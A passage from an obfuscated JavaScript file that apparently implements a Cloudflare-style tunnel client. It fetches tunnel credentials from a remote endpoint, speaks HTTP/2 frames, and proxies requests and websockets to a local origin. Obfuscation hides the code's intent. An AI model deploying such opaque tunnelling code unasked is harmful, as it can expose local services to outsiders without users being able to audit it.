                return z + A;
            },
            'fcOeZ': function (z, A) {
                return z + A;
            },
            'MQCKx': function (y, z) {
                return y(z);
            }
        };
    if (a[dp(0x7bc)] % 0x8 || a[dp(0x7bc)] < 0x18)
        throw new Error(b['LsdkU']);
    const c = [];
    for (let y = 0x0; y < b[dp(0x434)](a[dp(0x7bc)], 0x8); y++) {
        c['push'](a[dp(0x749)](b[dp(0x75f)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b['rjTqx'](a0an, c, 0x0);
    if (b[dp(0x620)](f, 0x1) || b[dp(0x1e0)](c[d], 0xffffn) !== 0x3n)
        throw new Error(b['YiwQL']);
    let h, j, k;
    [h, j, k] = b[dp(0x5fb)](a0an, c, b['qgNod'](d, f));
    const l = Number(b['IFZwT'](c[h], 0x30n) & 0xffffn);
    if (b['BLkWt'](l, 0x1))
        return {
            'ok': ![],
            'error': b[dp(0x4d5)](a0ao, c, b[dp(0x459)](h, j))
        };
    if (b[dp(0x573)](l, 0x0))
        return {
            'ok': ![],
            'error': b[dp(0xe7)](b['uBlBS'], l)
        };
    let m, n, o;
    [m, n, o] = a0an(c, b['VzDrg'](h, j));
    let p, q, r;
    [p, q, r] = a0an(c, m + n);
    const s = c[p], t = b[dp(0x57e)](Number, b[dp(0x2b4)](s, 0xffffn));
    if (b[dp(0x830)](t, 0x0))
        return {
            'ok': ![],
            'error': a0ao(c, b[dp(0x6af)](p, q))
        };
    if (b[dp(0x739)](t, 0x1))
        return {
            'ok': ![],
            'error': b[dp(0x459)](b[dp(0x305)], t)
        };
    let u, v, w;
    [u, v, w] = b[dp(0x5fb)](a0an, c, b[dp(0xcb)](p, q));
    const x = b[dp(0x5fb)](a0ao, c, b[dp(0x108)](b[dp(0x459)](u, v), 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b['MQCKx'](Boolean, b[dp(0x1e0)](c[u], 0x1n))
    };
}
const a0aq = {
    '.js': 'text/javascript;\x20charset=utf-8',
    '.mjs': a0aY(0xcf),
    '.css': a0aY(0x53a),
    '.json': a0aY(0x2ff),
    '.map': a0aY(0x2ff),
    '.wasm': a0aY(0x7ce),
    '.html': 'text/html;\x20charset=utf-8',
    '.htm': 'text/html;\x20charset=utf-8',
    '.svg': a0aY(0x4e3),
    '.xml': a0aY(0xf2),
    '.woff': a0aY(0x69f),
    '.woff2': 'font/woff2',
    '.png': a0aY(0x522),
    '.jpg': a0aY(0x825),
    '.jpeg': a0aY(0x825),
    '.gif': a0aY(0x655),
    '.ico': a0aY(0x812)
};
function a0ar(a) {
    const dq = a0aY, b = {
            'OYHYa': function (f, g) {
                return f < g;
            }
        }, c = a[dq(0x344)]('/') ? a[dq(0x462)](0x0, -0x1) : a, d = c['lastIndexOf']('.');
    if (b[dq(0x42a)](d, 0x0))
        return '';
    return a0aq[c[dq(0x462)](d)[dq(0x4ee)]()] || '';
}
function a0as(a) {
    const dr = a0aY, b = {
            'NFzUF': function (c, d) {
                return c !== d;
            },
            'xHkmq': dr(0x28f),
            'MzOlh': function (c, d) {
                return c + d;
            },
            'uPdEh': dr(0x2df)
        };
    if (Array[dr(0x1a7)](a))
        return Buffer[dr(0x664)](a);
    if (b[dr(0x350)](typeof a, 'string'))
        throw new Error(b[dr(0x368)]);
    return Buffer[dr(0x664)](b['MzOlh'](a, '='[dr(0x468)](-a['length'] % 0x4)), b[dr(0x27a)]);
}
const a0at = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0au(a) {
    const ds = a0aY, b = {
            'VtzmX': ds(0x31e),
            'hsUes': function (c, d) {
                return c(d);
            },
            'iRrKh': function (c, d) {
                return c + d;
            },
            'YDDVD': ds(0x709),
            'QPTfo': 'error',
            'UZuyY': ds(0x581),
            'aHejx': ds(0x77c),
            'aIRXe': function (c, d) {
                return c === d;
            },
            'vJDWE': ds(0x4f6),
            'ZXGxf': ds(0x4b8),
            'MAYHF': ds(0x412)
        };
    return new Promise((c, d) => {
        const dt = ds, f = {
                'qZsHh': b[dt(0x32c)],
                'SLiVh': function (j, k) {
                    return b['hsUes'](j, k);
                },
                'EvhUb': function (j, k) {
                    return b['iRrKh'](j, k);
                },
                'lIOVx': function (j, k) {
                    return j + k;
                },
                'yylnN': dt(0xd9),
                'bCnBy': dt(0x786),
                'MCKIc': b[dt(0xbc)],
                'dXliJ': function (j, k) {
                    return j(k);
                },
                'LiHWq': b[dt(0x2aa)],
                'xDaOE': b[dt(0x2cd)]
            };
        let g;
        try {
            g = new URL(a['replace'](/\/+$/, '') + dt(0x608));
        } catch (j) {
            b[dt(0xac)](d, new Error(b[dt(0x18d)] + j[dt(0x5a9)]));
            return;
        }
        const h = b[dt(0x18f)](g[dt(0x1c5)], b[dt(0x284)]) ? a0h : a0g, i = h[dt(0x133)](g, {
                'method': b[dt(0x689)],
                'headers': {
                    'Content-Type': b['MAYHF'],
                    'User-Agent': dt(0x2ab)
                },
                'timeout': 0x3a98
            }, k => {
                const du = dt, l = {
                        'TYGaU': f[du(0x7fb)],
                        'jHZTv': function (n, o) {
                            const dv = du;
                            return f[dv(0x568)](n, o);
                        },
                        'JMFPN': function (n, o) {
                            return f['EvhUb'](n, o);
                        },
                        'Ufoxt': function (n, o) {
                            const dw = du;
                            return f[dw(0x6ce)](n, o);
                        },
                        'AjLba': f[du(0xd4)],
                        'tQinC': f[du(0x3a6)],
                        'etedw': du(0x446),
                        'rvMWT': f[du(0x5b2)],
                        'SBCnR': function (n, o) {
                            const dx = du;
                            return f[dx(0x585)](n, o);
                        },
                        'CDAus': du(0x622)
                    }, m = [];
                k['on']('data', n => m[du(0x560)](n)), k['on'](f[du(0x5d2)], d), k['on'](f[du(0x25e)], () => {
                    const dy = du, n = Buffer[dy(0x12a)](m), o = k[dy(0x62b)];
                    let p;
                    try {
                        p = JSON[dy(0x517)](n[dy(0xec)](l[dy(0x745)]));
                    } catch (r) {
                        l[dy(0x433)](d, new Error(l[dy(0x3d1)](l[dy(0x3d1)](l[dy(0x3d1)](dy(0x501), o), dy(0x136)), n['subarray'](0x0, 0x12c)[dy(0xec)](dy(0x31e)))));
                        return;
                    }
                    const q = p[dy(0x835)] || {};
                    if (!(p['success'] ?? !![]) || !q) {
                        d(new Error(l['Ufoxt'](l['AjLba'], JSON[dy(0x823)](p[dy(0x24f)]))));
                        return;
                    }
                    try {
                        const s = String(q['id']);
                        if (!a0at[dy(0x75b)](s))
                            throw new Error(l[dy(0x172)]);
                        if (typeof q[dy(0x59c)] !== l[dy(0x2cf)] || typeof q[dy(0x5e8)] !== l[dy(0x2cf)])
                            throw new Error(l['rvMWT']);
                        const t = l['SBCnR'](a0as, q[dy(0x784)]), u = Buffer[dy(0x664)](s[dy(0xed)](/-/g, ''), dy(0x4e4));
                        c([
                            q[dy(0x5e8)],
                            q['account_tag'],
                            t,
                            u
                        ]);
                    } catch (v) {
                        d(new Error(l[dy(0x29e)] + v['message']));
                    }
                });
            });
        i['on'](dt(0x1c6), k => d(new Error(dt(0x77c) + k[dt(0x5a9)]))), i[dt(0x581)]();
    });
}
function a0av(a) {
    const dz = a0aY;
    return a[dz(0x415)](([b, c]) => Buffer[dz(0x664)](b, dz(0x31e))[dz(0xec)](dz(0x2df))[dz(0xed)](/=+$/, '') + ':' + Buffer[dz(0x664)](c, dz(0x31e))[dz(0xec)](dz(0x2df))[dz(0xed)](/=+$/, ''))[dz(0x16d)](';');
}
class a0aw {
    constructor(a) {
        const dA = a0aY, b = {
                'lHKSA': dA(0x4d6),
                'aYnfr': 'data',
                'BSSkm': dA(0x233)
            }, c = b[dA(0x4b0)][dA(0x493)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[dA(0x644)] = Buffer[dA(0x4b7)](0x0);
                continue;
            case '1':
                a['on'](dA(0x1c6), f => {
                    const dB = dA;
                    this[dB(0x798)] = f, this[dB(0x736)]();
                });
                continue;
            case '2':
                a['on'](b['aYnfr'], f => {
                    const dC = dA;
                    this[dC(0x644)] = this[dC(0x644)][dC(0x7bc)] ? Buffer[dC(0x12a)]([
                        this['buffer'],
                        f
                    ]) : f, this[dC(0x736)]();
                });
                continue;
            case '3':
                this[dA(0x3b7)] = ![];
                continue;
            case '4':
                this[dA(0x798)] = null;
                continue;
            case '5':
                a['on']('end', () => {
                    const dD = dA;
                    this['closed'] = !![], this[dD(0x736)]();
                });
                continue;
            case '6':
                this[dA(0x25f)] = a;
                continue;
            case '7':
                a['on'](b[dA(0x2a8)], () => {
                    const dE = dA;
                    this['closed'] = !![], this[dE(0x736)]();
                });
                continue;
            case '8':
                this['waiters'] = [];
                continue;
            }
            break;
        }
    }
    [a0aY(0x736)]() {
        const dF = a0aY, a = {
                'zgaFs': function (b, c) {
                    return b > c;
                },
                'AVCPm': function (b, c) {
                    return b >= c;
                },
                'tjlwW': function (b, c) {
                    return b !== c;
                }
            };
        while (a[dF(0x67f)](this[dF(0x3ca)][dF(0x7bc)], 0x0)) {
            const b = this['waiters'][0x0];
            if (a[dF(0x6b0)](this[dF(0x644)][dF(0x7bc)], b['need'])) {
                this[dF(0x3ca)]['shift']();
                const c = this['buffer'][dF(0x805)](0x0, b[dF(0x7ad)]);
                this['buffer'] = this[dF(0x644)][dF(0x805)](b['need']), b[dF(0x2c6)](c);
            } else {
                if (a[dF(0x1d2)](this[dF(0x798)], null))
                    this['waiters'][dF(0x3b9)](), b['reject'](this[dF(0x798)]);
                else {
                    if (this[dF(0x3b7)])
                        this[dF(0x3ca)][dF(0x3b9)](), b[dF(0x7dc)](new Error(dF(0x7fd)));
                    else
                        break;
                }
            }
        }
    }
    [a0aY(0x267)](a) {
        const dG = a0aY, b = {
                'DnINd': function (c, d) {
                    return c !== d;
                },
                'DtmCH': function (c, d) {
                    return c >= d;
                }
            };
        if (b[dG(0x737)](this['errored'], null))
            return Promise[dG(0x7dc)](this[dG(0x798)]);
        if (b['DtmCH'](this['buffer'][dG(0x7bc)], a)) {
            const c = this[dG(0x644)][dG(0x805)](0x0, a);
            return this[dG(0x644)] = this[dG(0x644)]['subarray'](a), Promise[dG(0x2c6)](c);
        }
        if (this[dG(0x3b7)])
            return Promise[dG(0x7dc)](new Error('connection\x20closed'));
        return new Promise((d, f) => {
            const dH = dG;
            this[dH(0x3ca)][dH(0x560)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this['_drain']();
        });
    }
}
class a0ax {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const dI = a0aY, l = '11|7|20|1|17|9|10|18|6|16|12|4|0|3|8|5|13|19|2|14|15'[dI(0x493)]('|');
        let m = 0x0;
        while (!![]) {
            switch (l[m++]) {
            case '0':
                this[dI(0x5c1)] = 0xffff;
                continue;
            case '1':
                this[dI(0x6a7)] = c;
                continue;
            case '2':
                this[dI(0x809)] = ![];
                continue;
            case '3':
                this['streamWindows'] = new Map();
                continue;
            case '4':
                this[dI(0x421)] = new a0af();
                continue;
            case '5':
                this[dI(0x4a4)] = new Map();
                continue;
            case '6':
                this[dI(0x334)] = i;
                continue;
            case '7':
                this[dI(0x5bd)] = new a0aw(a);
                continue;
            case '8':
                this[dI(0x364)] = a0a6;
                continue;
            case '9':
                this['tunnelId'] = f;
                continue;
            case '10':
                this[dI(0x3e4)] = g;
                continue;
            case '11':
                this[dI(0x6f5)] = a;
                continue;
            case '12':
                this[dI(0x164)] = k || { 'printed': ![] };
                continue;
            case '13':
                this['control'] = null;
                continue;
            case '14':
                this[dI(0xf5)] = ![];
                continue;
            case '15':
                this[dI(0x1ad)] = [];
                continue;
            case '16':
                this[dI(0x526)] = j;
                continue;
            case '17':
                this[dI(0x388)] = d;
                continue;
            case '18':
                this['log'] = h;
                continue;
            case '19':
                this[dI(0x549)] = ![];
                continue;
            case '20':
                this[dI(0x499)] = b;
                continue;
            }
            break;
        }
    }
    [a0aY(0xf4)](a, b, c, d = Buffer[a0aY(0x4b7)](0x0)) {
        const dJ = a0aY, f = {
                'SqwhE': function (h, i) {
                    return h > i;
                },
                'EtSre': dJ(0x1e5),
                'KBFXf': function (h, i) {
                    return h & i;
                }
            };
        if (f[dJ(0x685)](d[dJ(0x7bc)], 0xffffff))
            throw new Error(f[dJ(0x239)]);
        const g = Buffer[dJ(0x4b7)](0x9);
        g[dJ(0x73e)](d[dJ(0x7bc)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[dJ(0x3f8)](f[dJ(0x4c8)](c, 0x7fffffff), 0x5), this[dJ(0x6f5)][dJ(0x81f)](Buffer[dJ(0x12a)]([
            g,
            d
        ]));
    }
    [a0aY(0x286)](a, b, c = ![]) {
        const dK = a0aY, d = {
                'RvFlC': function (h, i) {
                    return h(i);
                },
                'oMbaT': function (h, i) {
                    return h | i;
                }
            }, f = d[dK(0x767)](a0ai, b), g = d['oMbaT'](0x4, c ? 0x1 : 0x0);
        this['sendFrame'](0x1, g, a, f);
    }
    [a0aY(0x625)](a) {
        const dL = a0aY, b = {
                'EvzjB': function (c, d) {
                    return c > d;
                }
            };
        if (this['connectionWindow'] > 0x0 && b['EvzjB'](this['streamWindows'][dL(0x7dd)](a) ?? 0xffff, 0x0))
            return Promise['resolve']();
        return new Promise(c => {
            const dM = dL;
            this['windowWaiters'][dM(0x560)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aY(0x59f)]() {
        const dN = a0aY, a = {
                'AAcdF': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[dN(0x1ad)]) {
            const d = this['streamWindows']['get'](c[dN(0x39f)]) ?? 0xffff;
            this[dN(0x5c1)] > 0x0 && a[dN(0x12b)](d, 0x0) ? c[dN(0x2c6)]() : b[dN(0x560)](c);
        }
        this['windowWaiters'] = b;
    }
    [a0aY(0x45a)]() {
        const dO = a0aY;
        for (const a of this[dO(0x1ad)]) {
            a[dO(0x2c6)]();
        }
        this['windowWaiters'] = [];
    }
    async [a0aY(0xd5)](a, b, c = ![]) {
        const dP = a0aY, d = {
                'DwyEy': function (h, i) {
                    return h - i;
                },
                'uQwGy': function (h, i) {
                    return h + i;
                },
                'aUNYu': function (h, i) {
                    return h < i;
                }
            }, f = b[dP(0x7bc)];
        let g = 0x0;
        do {
            await this['_waitWindow'](a);
            if (this[dP(0x549)])
                return;
            const h = this['streamWindows'][dP(0x7dd)](a) ?? 0xffff, i = Math[dP(0x6ab)](d[dP(0x750)](f, g), this['connectionWindow'], h, this[dP(0x364)]), j = c && d['uQwGy'](g, i) >= f ? 0x1 : 0x0, k = b[dP(0x805)](g, d[dP(0x60a)](g, i));
            this['connectionWindow'] -= i, this[dP(0x53f)][dP(0x39b)](a, d['DwyEy'](h, i)), this['sendFrame'](0x0, j, a, k), g += i;
        } while (d[dP(0x15c)](g, f));
    }
    [a0aY(0x1f3)](a, b) {
        const dQ = a0aY, c = {
                'VhCOq': function (d, f) {
                    return d > f;
                },
                'ujhRB': function (d, f) {
                    return d & f;
                }
            };
        if (c[dQ(0x121)](b, 0x0)) {
            const d = Buffer[dQ(0x4b7)](0x4);
            d[dQ(0x3f8)](c[dQ(0x2d1)](b, 0x7fffffff), 0x0), this[dQ(0xf4)](0x8, 0x0, a, d);
        }
    }
    async ['readFrame']() {
        const dR = a0aY, a = {
                'WcCKi': function (i, j) {
                    return i & j;
                }
            }, b = await this[dR(0x5bd)][dR(0x267)](0x9), c = b['readUIntBE'](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[dR(0x338)](b['readUInt32BE'](0x5), 0x7fffffff), h = await this[dR(0x5bd)][dR(0x267)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aY(0x5df)](a, b, c) {
        const dS = a0aY, d = {
                'fuWJp': function (g, h) {
                    return g & h;
                },
                'TSlPi': function (g, h) {
                    return g > h;
                },
                'fdOnx': dS(0x465),
                'mCOZc': function (g, h) {
                    return g - h;
                },
                'BxAno': function (g, h) {
                    return g & h;
                },
                'prOpL': function (g, h) {
                    return g !== h;
                },
                'xGHJS': 'expected\x20CONTINUATION\x20frame'
            };
        if (d[dS(0x61b)](a, 0x8)) {
            const g = c[0x0];
            c = c[dS(0x805)](0x1);
            if (d['TSlPi'](g, c['length']))
                throw new Error(d[dS(0x309)]);
            c = g ? c['subarray'](0x0, d['mCOZc'](c[dS(0x7bc)], g)) : c;
        }
        d[dS(0x61b)](a, 0x20) && (c = c[dS(0x805)](0x5));
        const f = [c];
        while (!d['BxAno'](a, 0x4)) {
            const h = await this['readFrame']();
            if (h[0x0] !== 0x9 || d[dS(0x37d)](h[0x2], b))
                throw new Error(d[dS(0x6c8)]);
            f[dS(0x560)](h[0x3]), a = h[0x1];
        }
        return this[dS(0x421)][dS(0x376)](Buffer[dS(0x12a)](f));
    }
    ['openControl'](a) {
        const dT = a0aY, b = {
                'eguOm': function (c, d) {
                    return c !== d;
                },
                'ydUzy': dT(0xf6),
                'daNEm': dT(0x3cf)
            };
        if (b[dT(0x5e4)](this['control'], null))
            return;
        this[dT(0x43e)] = new a0az(this, a, this[dT(0x569)]), this[dT(0x286)](a, [[
                b[dT(0x505)],
                b[dT(0x6d6)]
            ]]), this['control']['start'](this['accountTag'], this[dT(0x388)], this[dT(0x240)], this[dT(0x3e4)]);
    }
    ['updateConfig'](a, b) {
        const dU = a0aY, c = {
                'bGGik': dU(0xf6),
                'ctIpk': dU(0x3cf),
                'LEdTb': dU(0x5c0),
                'CqAkg': 'application/json',
                'zjutI': dU(0x557)
            };
        let d = 0x0;
        try {
            const g = JSON[dU(0x517)](b[dU(0x7bc)] ? b['toString'](dU(0x31e)) : '{}'), h = parseInt(g['version'], 0xa);
            !Number['isNaN'](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[dU(0x664)](JSON[dU(0x823)]({ 'latestAppliedVersion': d }));
        this[dU(0x286)](a, [
            [
                c['bGGik'],
                c['ctIpk']
            ],
            [
                c[dU(0x719)],
                c[dU(0x640)]
            ],
            [
                c[dU(0x761)],
                String(f['length'])
            ]
        ]), this[dU(0xd5)](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const dV = a0aY, c = { 'RVgSv': dV(0x173) };
        if (b['upgrade'] === c[dV(0x5c3)]) {
            this['updateConfig'](a, Buffer['concat'](b['body']));
            return;
        }
        if (b[dV(0xfe)])
            return;
        if (b[dV(0x1b7)])
            return;
        b[dV(0x1b7)] = !![], this[dV(0x529)](a, b)['catch'](() => {
        });
    }
    async [a0aY(0x529)](a, b) {
        const dW = a0aY, c = {
                'mVLWi': function (d, f) {
                    return d === f;
                },
                'jMNpe': dW(0x557),
                'ngDWz': dW(0x7b9),
                'UIDtY': dW(0x18b),
                'WHaRv': function (d, f) {
                    return d === f;
                },
                'KqopR': dW(0x46a),
                'AAHdQ': 'sec-websocket-accept',
                'EQjes': function (d, f) {
                    return d(f);
                },
                'mipaQ': dW(0x5c0),
                'UfYXo': function (d, f) {
                    return d(f);
                },
                'UUtLI': dW(0xf6),
                'soFBn': function (d, f) {
                    return d(f);
                },
                'padeW': dW(0x681),
                'UnLJv': dW(0x416),
                'gASBL': '{\x22src\x22:\x22origin\x22,\x22flow_rate_limited\x22:false}',
                'FPVUB': function (d, f) {
                    return d + f;
                },
                'ArQPo': dW(0x5a6),
                'eKWCw': dW(0x52b)
            };
        try {
            const d = await a0aC(this[dW(0x499)], b[dW(0x57b)], b[dW(0x7d7)], b[dW(0xce)], Buffer[dW(0x12a)](b[dW(0x3dd)])), f = [], g = [];
            for (const [k, l] of d[dW(0xce)]) {
                const m = k['toLowerCase']();
                c['mVLWi'](m, c[dW(0x35d)]) && g[dW(0x560)]([
                    m,
                    l
                ]);
                const n = m[dW(0x315)](c[dW(0x777)]) || m[dW(0x315)](c['UIDtY']) || m[dW(0x315)](dW(0x7b3)) || m[dW(0x315)](':');
                (!n || c['WHaRv'](m, dW(0x3d6)) || c[dW(0x811)](m, c[dW(0x841)]) || m === c[dW(0x12f)]) && f['push']([
                    m,
                    l
                ]);
            }
            if (!f['some'](([o]) => o === dW(0x5c0))) {
                const o = c[dW(0x7e7)](a0ar, b[dW(0x7d7)]);
                o && f[dW(0x560)]([
                    c[dW(0x83a)],
                    o
                ]);
            }
            const h = c['UfYXo'](a0av, f), i = d[dW(0x75d)] === 0x65 ? 0xc8 : d[dW(0x75d)], j = [
                    [
                        c[dW(0x730)],
                        c[dW(0xb6)](String, i)
                    ],
                    ...g,
                    [
                        c['padeW'],
                        h
                    ],
                    [
                        c[dW(0x2ba)],
                        c[dW(0x353)]
                    ]
                ];
            this[dW(0x286)](a, j);
            for await (const p of d['body']) {
                await this[dW(0xd5)](a, p, ![]);
            }
            await this[dW(0xd5)](a, Buffer[dW(0x4b7)](0x0), !![]);
        } catch (q) {
            this[dW(0x569)]['warning'](c[dW(0x2e9)](dW(0x375) + a + c[dW(0x4dd)], q));
            try {
                this[dW(0x286)](a, [[
                        c['UUtLI'],
                        c['eKWCw']
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aY(0x3c1)]() {
        const dX = a0aY, a = {
                'EtbBV': dX(0x2fc),
                'LVZSY': dX(0x2a7),
                'TpstY': function (d, f) {
                    return d + f;
                },
                'nUjbh': function (d, f) {
                    return d % f;
                },
                'sDPmK': 'invalid\x20SETTINGS\x20payload',
                'knZtr': function (d, f) {
                    return d < f;
                },
                'oMuPy': function (d, f) {
                    return d === f;
                },
                'sczYL': function (d, f) {
                    return d - f;
                },
                'dYStl': function (d, f) {
                    return d >= f;
                },
                'GBDQB': function (d, f) {
                    return d <= f;
                },
                'BqZuO': function (d, f) {
                    return d === f;
                },
                'LvSVO': function (d, f) {
                    return d & f;
                },
                'cDexO': function (d, f) {
                    return d === f;
                },
                'hOYAU': function (d, f) {
                    return d & f;
                }
            }, b = await this['reader']['readExact'](0x18);
        if (!b[dX(0x3a9)](Buffer[dX(0x664)](a[dX(0x3d9)])))
            throw new Error(a['LVZSY']);
        const c = Buffer[dX(0x4b7)](0x6);
        c[dX(0x70a)](0x3, 0x0), c[dX(0x3f8)](0x64, 0x2), this[dX(0xf4)](0x4, 0x0, 0x0, c);
        this[dX(0x526)] && !this[dX(0x164)]['printed'] && (process['stdout'][dX(0x81f)](a[dX(0x790)](this[dX(0x334)], '\x0a')), this[dX(0x164)][dX(0x342)] = !![]);
        try {
            while (!this[dX(0x549)]) {
                const [d, f, g, h] = await this[dX(0x335)]();
                if (d === 0x4) {
                    if (!(f & 0x1)) {
                        if (a[dX(0x165)](h[dX(0x7bc)], 0x6))
                            throw new Error(a[dX(0x2c5)]);
                        for (let i = 0x0; a['knZtr'](i, h['length']); i += 0x6) {
                            const j = h[dX(0x7bb)](i), k = h[dX(0xa5)](i + 0x2);
                            if (a[dX(0x849)](j, 0x4)) {
                                const l = a[dX(0x6b9)](k, 0xffff);
                                for (const m of this[dX(0x53f)][dX(0x80a)]()) {
                                    this[dX(0x53f)]['set'](m, Math['max'](0x0, a[dX(0x790)](this[dX(0x53f)][dX(0x7dd)](m), l)));
                                }
                            } else
                                j === 0x5 && a[dX(0x2c0)](k, 0x4000) && a['GBDQB'](k, 0xffffff) && (this[dX(0x364)] = k);
                        }
                        this['sendFrame'](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[dX(0x185)](d, 0x6)) {
                    !a[dX(0x1a6)](f, 0x1) && this[dX(0xf4)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a['cDexO'](d, 0x8)) {
                    if (h[dX(0x7bc)] !== 0x4)
                        continue;
                    const n = a[dX(0x481)](h[dX(0xa5)](0x0), 0x7fffffff);
                    a['oMuPy'](g, 0x0) ? this[dX(0x5c1)] += n : this['streamWindows'][dX(0x39b)](g, a[dX(0x790)](this[dX(0x53f)][dX(0x7dd)](g) ?? 0xffff, n));
                    this[dX(0x59f)]();
                    continue;
                }
                if (a['oMuPy'](d, 0x3)) {
                    this[dX(0x4a4)][dX(0xfd)](g);
                    continue;
                }
                if (d === 0x7)
                    break;
                if (d === 0x1) {
                    const o = await this['readHeaders'](f, g, h);
                    !this[dX(0x53f)][dX(0x74c)](g) && this[dX(0x53f)][dX(0x39b)](g, 0xffff);
                    this[dX(0x72c)](g, f, o);
                    continue;
                }
                if (d === 0x0) {
                    this['handleData'](g, f, h);
                    continue;
                }
            }
        } finally {
            this[dX(0x549)] = !![], this[dX(0x45a)]();
            for (const p of this['streams']['values']()) {
                p[dX(0x329)] && p['websocketProxy'][dX(0x48e)]();
            }
            try {
                this[dX(0x6f5)]['destroy']();
            } catch (q) {
            }
        }
    }
    [a0aY(0x72c)](a, b, c) {
        const dY = a0aY, d = {
                'pilil': function (i, j) {
                    return i & j;
                },
                'gsfXp': ':method',
                'SRkUK': dY(0x390),
                'ENQir': ':path',
                'jKxfq': dY(0x441),
                'IDJIr': function (i, j) {
                    return i === j;
                },
                'fMyps': dY(0xfe),
                'LxXYQ': function (i, j) {
                    return i(j);
                }
            }, f = {};
        for (const [i, j] of c) {
            i[dY(0x315)](':') ? f[i] = j : f[i[dY(0x4ee)]()] = j;
        }
        const g = (f[a0a4] || '')['trim']()[dY(0x4ee)]();
        if (g === a0a5) {
            this[dY(0x1e6)](a);
            d[dY(0x51b)](b, 0x1) && (this['control'][dY(0x1b7)] = !![]);
            return;
        }
        const h = {
            'method': f[d[dY(0x2f9)]] || d[dY(0x349)],
            'path': f[d[dY(0x34e)]] || '/',
            'authority': f[d[dY(0x48a)]] || '',
            'headers': c['filter'](([k]) => !k[dY(0x315)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[dY(0x248)](g, d[dY(0x7cb)]) || d[dY(0x248)]((f[':protocol'] || '')[dY(0x4ee)](), dY(0xfe)),
            'ended': d[dY(0xc7)](Boolean, d[dY(0x51b)](b, 0x1)),
            'finished': ![]
        };
        this[dY(0x4a4)][dY(0x39b)](a, h);
        if (h['websocket'])
            h[dY(0x329)] = new a0ay(this, a, h, this[dY(0x499)], this[dY(0x569)]), h[dY(0x329)][dY(0x715)]();
        else
            h[dY(0x209)] && this[dY(0x4d1)](a, h);
    }
    ['handleData'](a, b, c) {
        const dZ = a0aY, d = {
                'OZkso': function (g, h) {
                    return g !== h;
                },
                'qXHaX': function (g, h) {
                    return g === h;
                },
                'aoyMu': function (g, h) {
                    return g & h;
                },
                'ugAPA': function (g, h) {
                    return g === h;
                },
                'tLcld': function (g, h) {
                    return g(h);
                },
                'CoCpJ': function (g, h) {
                    return g & h;
                }
            };
        this[dZ(0x1f3)](0x0, c[dZ(0x7bc)]), this[dZ(0x1f3)](a, c[dZ(0x7bc)]);
        if (d[dZ(0x567)](this[dZ(0x43e)], null) && d[dZ(0x5fc)](this[dZ(0x43e)][dZ(0x39f)], a)) {
            this[dZ(0x43e)]['feed'](c);
            d[dZ(0x457)](b, 0x1) && (this[dZ(0x43e)]['finished'] = !![]);
            return;
        }
        const f = this['streams'][dZ(0x7dd)](a);
        if (d[dZ(0x5b3)](f, undefined))
            return;
        if (d[dZ(0x567)](f[dZ(0x329)], undefined)) {
            f[dZ(0x329)][dZ(0x5d6)](c, d[dZ(0x486)](Boolean, d[dZ(0x7f2)](b, 0x1)));
            return;
        }
        c[dZ(0x7bc)] && f[dZ(0x3dd)][dZ(0x560)](c), d['aoyMu'](b, 0x1) && (f['ended'] = !![], this[dZ(0x4d1)](a, f));
    }
}
class a0ay {
    constructor(a, b, c, d, f) {
        const e0 = a0aY, g = { 'hERPT': e0(0x495) }, h = g['hERPT'][e0(0x493)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this['connection'] = a;
                continue;
            case '1':
                this['streamId'] = b;
                continue;
            case '2':
                this['log'] = f;
                continue;
            case '3':
                this['sock'] = null;
                continue;
            case '4':
                this['stopped'] = ![];
                continue;
            case '5':
                this[e0(0x3c6)] = [];
                continue;
            case '6':
                this[e0(0x499)] = d;
                continue;
            case '7':
                this[e0(0x3ca)] = [];
                continue;
            case '8':
                this['request'] = c;
                continue;
            }
            break;
        }
    }
    [a0aY(0x715)]() {
        const e1 = a0aY;
        this['run']()[e1(0x521)](() => {
        });
    }
    [a0aY(0x5d6)](a, b = ![]) {
        const e2 = a0aY;
        a['length'] && this[e2(0x3c6)][e2(0x560)](a), b && this[e2(0x3c6)]['push'](null), this['_wake']();
    }
    [a0aY(0x48e)]() {
        const e3 = a0aY, a = {
                'cudEi': function (b, c) {
                    return b !== c;
                }
            };
        if (this[e3(0x549)])
            return;
        this[e3(0x549)] = !![], this['_wake']();
        if (a[e3(0x3b4)](this[e3(0x6f5)], null))
            try {
                this[e3(0x6f5)]['destroy']();
            } catch (b) {
            }
    }
    [a0aY(0x21e)]() {
        const e4 = a0aY, a = {
                'oCPSj': function (b) {
                    return b();
                }
            };
        for (const b of this[e4(0x3ca)]) {
            a[e4(0x73a)](b);
        }
        this[e4(0x3ca)] = [];
    }
    async [a0aY(0x672)]() {
        const e5 = a0aY;
        while (!this[e5(0x549)]) {
            if (this[e5(0x3c6)][e5(0x7bc)])
                return this[e5(0x3c6)][e5(0x3b9)]();
            await new Promise(a => this[e5(0x3ca)]['push'](a));
        }
        return null;
    }
    async [a0aY(0x3c1)]() {
        const e6 = a0aY, a = {
                'PyHTe': function (b, c) {
                    return b(c);
                },
                'wTIqU': function (b, c) {
                    return b === c;
                },
                'XMWJJ': e6(0x7b9),
                'GWlOc': e6(0x18b),
                'glWCG': e6(0x46a),
                'equPp': function (b, c) {
                    return b === c;
                },
                'yQKzz': e6(0x687),
                'AGavt': function (b, c) {
                    return b(c);
                },
                'hJNmF': function (b, c) {
                    return b(c);
                },
                'wSbuT': 'cf-cloudflared-response-meta',
